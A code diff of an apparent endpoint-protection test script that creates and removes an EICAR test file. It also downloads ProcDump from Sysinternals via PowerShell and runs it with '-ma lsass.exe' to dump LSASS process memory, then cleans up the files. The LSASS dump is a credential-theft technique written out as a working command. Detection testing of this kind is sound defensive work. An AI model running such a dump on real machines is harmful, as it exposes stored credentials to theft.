@@ -9,9 +9,10 @@ from colorama import init as colorama_init
 from colorama import Fore
 from colorama import Style
 
+# Initialize Colors
 colorama_init()
 
-
+# Check if user running is NT/AUTHORITY | Administrator
 def is_admin():
     """Returns True if script is running with administrator privileges."""
     try:
@@ -64,7 +65,21 @@ class EPScenario:
             files = [os.path.join(self.path, f) for f in os.listdir(self.path) if "eicar" in f.lower()]
             if files:
                 print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} File created: EICAR.txt!\n\n")
+
+            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Looking for generated EICAR file.\n")
+            cleanDesktop = [os.path.join(self.path, f) for f in os.listdir(self.path) if "eicar" in f.lower()]
             
+            if not cleanDesktop:
+                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} No files to delete!\n")
+            else:
+                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Waiting 5 seconds for EICAR detection...\n")
+                sleep(5)
+                print(f"{Fore.RED}[-] EICAR FILE FOUND!\n\nDELETING.\n\n{Style.RESET_ALL}")
+                for file in cleanDesktop:
+                    if os.path.isfile(file):
+                        os.remove(file)
+                        sleep(2)
+                        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Desktop cleaned.\n")
 
         except FileNotFoundError as e:
             print("{Fore.RED}[-]{Style.RESET_ALL} Path not found.\n")
@@ -81,13 +96,13 @@ class EPScenario:
 
     def _dump_setup(self):
         """
-        Make relevant directories -> easier cleanup
+        Make relevant directories for easier cleanup
         """
 
         os.makedirs(self.path + "ProcDump", exist_ok=True)
         os.makedirs(self.path + "Dump", exist_ok=True)
-
-        return self.path + "ProcDump"
+        path_ = os.path.join(f"{self.path}", "ProcDump")
+        return path_
 
     
     def _check_cleaned(self):
@@ -112,6 +127,7 @@ class EPScenario:
                 try:
                     if os.path.isdir(file):  
                         shutil.rmtree(file, ignore_errors=True)  # Delete directory
+                        sleep(2)
                         print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted directory: {file}\n")
                         sf_dir = True
                     elif os.path.isfile(file):  
@@ -125,32 +141,32 @@ class EPScenario:
     
     def dump_lsass(self):
 
-        path = self._dump_setup() # Path-To-Desktop\\ProcDump
-        procZip = "Procdump.zip"
+        extraction_path = self._dump_setup()
 
         # Download Procdump
         sp.run([PS, "-Command", f"""Invoke-WebRequest https://download.sysinternals.com/files/Procdump.zip -OutFile {self.path}Procdump.zip"""] ,shell=True, text=True)
-        joined_path = self.path+procZip
+        zip_path = os.path.join(self.path, "Procdump.zip")
 
         # Unzip file
-        with ZipFile(joined_path, "r") as procObject:
-            procObject.extractall(path=path)
-
-        sleep(2)
+        with ZipFile(zip_path, "r") as procObject:
+            procObject.extractall(path=extraction_path)
 
         # Run command
         try:    
-            args = f'"{path}\\procdump64.exe" -accepteula -ma lsass.exe "{self.path}\\Dump\\lsass.dmp"'
+            args = f'"{extraction_path}\\procdump64.exe" -accepteula -ma lsass.exe "{self.path}\\Dump\\lsass.dmp"'
             sp.run(["cmd.exe", "/c", args], shell=True, text=True)
 
         # Handle error
         except PermissionError as e:
+            sleep(3)
             print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Initialized ProcDump in Dump directory!\n")
-            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Lsass.dmp created at: {self.path}\\Dump..\nStarting cleanup.....\n")
+            sleep(2)
+            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Lsass.dmp created at: {self.path}\\Dump\n\n{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Starting cleanup.....\n")
 
             cleaned_success = self._check_cleaned()
 
             if cleaned_success:
+                    sleep(2)
                     print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Cleaning done!\n")
             else:
                 print(f"{Fore.RED}[-]{Style.RESET_ALL} Cleaning files failed!\n")
